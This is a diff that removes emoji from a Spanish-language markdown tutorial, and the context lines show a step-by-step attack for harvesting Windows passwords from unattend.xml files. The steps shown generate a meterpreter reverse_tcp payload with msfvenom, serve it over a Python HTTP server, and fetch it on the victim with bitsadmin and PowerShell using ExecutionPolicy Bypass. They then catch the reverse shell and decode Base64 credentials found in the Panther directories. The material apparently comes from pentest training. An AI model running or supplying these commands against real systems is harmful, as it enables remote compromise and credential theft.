@@ -1,20 +1,20 @@
-# 🔍 Searching for Passwords in Windows Configuration Files (unattend.xml)
+# Searching for Passwords in Windows Configuration Files (unattend.xml)
 
 ---
 
-## 🧠 Objetivo
+##  Objetivo
 Extraer contraseñas almacenadas en archivos de configuración de Windows (`unattend.xml`) a través de una sesión `meterpreter`, después de comprometer el equipo con un payload personalizado.
 
 ---
 
-## 🧰 Requisitos
+##  Requisitos
 - Acceso a una máquina atacante con Kali Linux.
 - Acceso inicial a una máquina víctima con Windows.
 - `msfvenom`, `msfconsole`, servidor HTTP (Python), sesión `meterpreter`.
 
 ---
 
-## ⚙️ Paso 1: Crear el payload malicioso
+##  Paso 1: Crear el payload malicioso
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<tu_IP> LPORT=<puerto> -f exe > payload.exe
@@ -26,7 +26,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<tu_IP> LPORT=<puerto> -f 
 
 ---
 
-## 📡 Paso 2: Servir el payload con Python
+##  Paso 2: Servir el payload con Python
 
 ```bash
 python3 -m http.server 80
@@ -36,7 +36,7 @@ python3 -m http.server 80
 
 ---
 
-## 💻 Paso 3: Descargar el payload desde la máquina víctima
+##  Paso 3: Descargar el payload desde la máquina víctima
 
 ```cmd
 bitsadmin /transfer payload /download /priority high http://<tu_IP>/payload.exe C:\Windows\Temp\payload.exe
@@ -50,7 +50,7 @@ powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://<tu_I
 
 ---
 
-## 🚀 Paso 4: Lanzar Metasploit y configurar el handler
+##  Paso 4: Lanzar Metasploit y configurar el handler
 
 ```bash
 msfconsole
@@ -66,7 +66,7 @@ exploit -j
 
 ---
 
-## 🧨 Paso 5: Ejecutar el payload desde la víctima
+##  Paso 5: Ejecutar el payload desde la víctima
 
 ```cmd
 C:\Windows\Temp\payload.exe
@@ -76,7 +76,7 @@ Una vez ejecutado, recibirás una sesión en Metasploit.
 
 ---
 
-## 🛰️ Paso 6: Buscar archivos de configuración en la víctima
+##  Paso 6: Buscar archivos de configuración en la víctima
 
 Desde la sesión `meterpreter`:
 
@@ -98,7 +98,7 @@ cd C:\\Windows\\Panther\\UnattendGC
 
 ---
 
-## 🔍 Paso 7: Leer y decodificar la contraseña (Base64)
+##  Paso 7: Leer y decodificar la contraseña (Base64)
 
 Abre el archivo `unattend.xml` descargado y localiza la línea:
 
@@ -128,7 +128,7 @@ O en PowerShell:
 
 ---
 
-## ✅ Notas importantes
+##  Notas importantes
 
 - `unattend.xml` se usa en despliegues automatizados de Windows (Sysprep) y **suele contener contraseñas en texto claro o Base64**.
 - También revisa: `sysprep.xml`, `autounattend.xml`, o cualquier `.xml` en `C:\Windows\Panther\` y `C:\Windows\System32\Sysprep`.
